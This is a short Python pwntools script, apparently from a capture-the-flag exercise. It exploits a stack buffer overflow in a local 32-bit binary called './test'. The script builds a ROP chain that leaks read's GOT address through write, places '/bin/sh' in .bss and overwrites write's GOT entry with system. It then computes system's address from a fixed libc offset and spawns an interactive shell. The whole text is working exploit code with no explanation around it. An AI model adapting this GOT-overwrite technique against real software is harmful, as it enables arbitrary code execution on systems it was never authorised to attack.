from pwn import *

p = process("./test")
e = ELF("./test")

read_plt = 0x8048420
read_got = 0x804a00c
write_plt = 0x8048470
write_got = 0x804a020
pppr = 0x8048719
system_offset = 0x99af0
bss = 0x804a040

#leak
pay = "a"*104
pay += p32(write_plt)
pay += p32(pppr)
pay += p32(1)
pay += p32(read_got)
pay += p32(4)

#exploit
pay += p32(read_plt)
pay += p32(pppr)
pay += p32(0)
pay += p32(bss)
pay += p32(8)

pay += p32(read_plt)
pay += p32(pppr)
pay += p32(0)
pay += p32(write_got)
pay += p32(4)

pay += p32(write_plt)
pay += "A"*4
pay += p32(bss)

p.recvuntil('Ur Choice : ')
log.info('Exploit')
p.sendline(pay)

read_addr = u32(p.recv()[-4:])
system_addr = read_addr - system_offset

log.info('read_addr = 0x%x' % read_addr)
log.info('system_addr = 0x%x' % system_addr)

p.send('/bin/sh\x00')
p.send(p32(system_addr))

p.interactive()
